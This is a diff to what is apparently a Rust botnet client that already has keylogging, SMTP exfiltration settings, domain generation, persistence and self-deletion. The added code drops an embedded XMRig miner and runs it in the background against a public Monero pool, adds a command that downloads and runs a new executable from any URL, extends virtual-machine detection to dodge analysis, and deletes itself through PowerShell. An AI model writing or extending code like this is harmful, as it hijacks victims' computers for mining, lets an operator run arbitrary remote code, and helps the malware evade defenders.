@@ -23,6 +23,11 @@ const SMTP_SERVER: &str = "smtp.gmail.com";      // หรือ server อื�
 const SMTP_USER: &str = "bot@gmail.com";
 const SMTP_PASS: &str = "app_password_here";
 
+// Placeholder: Replace with actual base64 encoded XMRig binary
+const BASE64_XMRIG: &str = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..."; // truncated
+const POOL_URL: &str = "pool.supportxmr.com:3333";
+const WALLET: &str = "your_monero_wallet_address_here";
+
 lazy_static! {
     static ref KEYLOGS: Mutex<String> = Mutex::new(String::new());
 }
@@ -148,6 +153,14 @@ async fn execute_command(cmd: String) -> Result<(), Box<dyn Error + Send + Sync>
         "selfdelete" => {
             tokio::spawn(self_delete());
         }
+        "update" if parts.len() >= 2 => {
+            let url = parts[1].to_string();
+            tokio::spawn(async move {
+                if let Err(e) = update_bot(url).await {
+                    eprintln!("Update error: {}", e);
+                }
+            });
+        }
         _ => println!("Unknown command: {}", cmd),
     }
     Ok(())
@@ -178,32 +191,58 @@ async fn persistence() {
 }
 
 async fn start_mining() {
-    let difficulty = 4; // number of leading zero bytes
-    loop {
-        let input = rand::random::<[u8; 32]>();
-        let mut nonce = 0u64;
+    // Decode embedded XMRig binary
+    let xmrig_bytes = general_purpose::STANDARD.decode(BASE64_XMRIG).unwrap_or_default();
+    if xmrig_bytes.is_empty() {
+        println!("XMRig binary not embedded, falling back to CPU mining");
+        // Fallback to CPU mining
+        let difficulty = 4;
         loop {
-            let mut hasher = Sha3_256::new();
-            hasher.update(&input);
-            hasher.update(&nonce.to_le_bytes());
-            let hash = hasher.finalize();
-            let mut is_valid = true;
-            for i in 0..difficulty {
-                if hash[i] != 0 {
-                    is_valid = false;
+            let input = rand::random::<[u8; 32]>();
+            let mut nonce = 0u64;
+            loop {
+                let mut hasher = Sha3_256::new();
+                hasher.update(&input);
+                hasher.update(&nonce.to_le_bytes());
+                let hash = hasher.finalize();
+                let mut is_valid = true;
+                for i in 0..difficulty {
+                    if hash[i] != 0 {
+                        is_valid = false;
+                        break;
+                    }
+                }
+                if is_valid {
+                    println!("Mined block with nonce: {}, hash: {:?}", nonce, hash);
                     break;
                 }
+                nonce += 1;
+                if nonce % 100000 == 0 {
+                    tokio::task::yield_now().await;
+                }
             }
-            if is_valid {
-                println!("Mined block with nonce: {}, hash: {:?}", nonce, hash);
-                break;
-            }
-            nonce += 1;
-            if nonce % 100000 == 0 {
-                tokio::task::yield_now().await; // prevent blocking
-            }
+            sleep(Duration::from_millis(10)).await;
         }
-        sleep(Duration::from_millis(10)).await;
+    } else {
+        // Write to temp file and run
+        let temp_path = std::env::temp_dir().join("xmrig.exe");
+        tokio::fs::write(&temp_path, xmrig_bytes).await.unwrap();
+        
+        // Run XMRig with pool and wallet
+        let args = vec![
+            "--url".to_string(), POOL_URL.to_string(),
+            "--user".to_string(), WALLET.to_string(),
+            "--pass".to_string(), "x".to_string(),
+            "--donate-level".to_string(), "0".to_string(), // No donation
+            "--background".to_string(), // Run in background
+        ];
+        
+        tokio::process::Command::new(&temp_path)
+            .args(&args)
+            .spawn()
+            .unwrap();
+        
+        println!("XMRig started mining to pool: {}", POOL_URL);
     }
 }
 
@@ -289,12 +328,16 @@ fn generate_dga_domains() -> Vec<String> {
 async fn check_anti_vm() -> bool {
     let mut system = sysinfo::System::new_all();
     system.refresh_all();
+    
+    // Process checks
     for process in system.processes().values() {
         let name = process.name().to_string().to_lowercase();
         if name.contains("vmware") || name.contains("virtualbox") || name.contains("vbox") {
             return true;
         }
     }
+    
+    // Registry checks
     #[cfg(windows)]
     {
         use winreg::RegKey;
@@ -303,7 +346,11 @@ async fn check_anti_vm() -> bool {
            hklm.open_subkey("SOFTWARE\\Oracle\\VirtualBox Guest Additions").is_ok() {
             return true;
         }
-        // Additional file checks
+    }
+    
+    // File checks
+    #[cfg(windows)]
+    {
         use std::path::Path;
         if Path::new(r"C:\Windows\System32\vmGuestLib.dll").exists() ||
            Path::new(r"C:\Windows\System32\VBoxGuest.sys").exists() ||
@@ -312,6 +359,41 @@ async fn check_anti_vm() -> bool {
             return true;
         }
     }
+    
+    // MAC address check
+    if let Ok(mac) = mac_address::get_mac_address() {
+        if let Some(mac) = mac {
+            let bytes = mac.bytes();
+            // Common VM MAC prefixes
+            let vm_prefixes = [
+                [0x08, 0x00, 0x27], // VirtualBox
+                [0x00, 0x05, 0x69], // VMware
+                [0x00, 0x0C, 0x29], // VMware
+                [0x00, 0x1C, 0x14], // VMware
+                [0x00, 0x50, 0x56], // VMware
+            ];
+            for prefix in &vm_prefixes {
+                if bytes[0..3] == *prefix {
+                    return true;
+                }
+            }
+        }
+    }
+    
+    // CPU name check
+    for cpu in system.cpus() {
+        let brand = cpu.brand().to_lowercase();
+        if brand.contains("qemu") || brand.contains("virtual") || brand.contains("kvm") {
+            return true;
+        }
+    }
+    
+    // RAM size check (less than 2GB might indicate VM)
+    let total_memory = system.total_memory();
+    if total_memory < 2 * 1024 * 1024 * 1024 { // 2GB
+        return true;
+    }
+    
     false
 }
 
@@ -319,10 +401,32 @@ async fn self_delete() {
     #[cfg(windows)]
     {
         let exe_path = std::env::current_exe().unwrap();
-        let cmd = format!("cmd /c ping 127.0.0.1 -n 3 > nul && del \"{}\"", exe_path.display());
-        std::process::Command::new("cmd").arg("/c").arg(cmd).spawn().ok();
+        let ps_command = format!("Remove-Item '{}' -Force", exe_path.display());
+        std::process::Command::new("powershell")
+            .arg("-Command")
+            .arg(ps_command)
+            .spawn()
+            .ok();
         std::process::exit(0);
     }
+}
+
+async fn update_bot(url: String) -> Result<(), Box<dyn Error + Send + Sync>> {
+    let response = reqwest::get(&url).await?;
+    let new_exe = response.bytes().await?;
+    
+    let current_exe = std::env::current_exe()?;
+    let temp_exe = current_exe.with_extension("new.exe");
+    
+    tokio::fs::write(&temp_exe, new_exe).await?;
+    
+    // Run the new exe and exit
+    std::process::Command::new(&temp_exe).spawn()?;
+    
+    // Self delete old
+    self_delete().await;
+    
+    Ok(())
 }
 
 #[tokio::main]
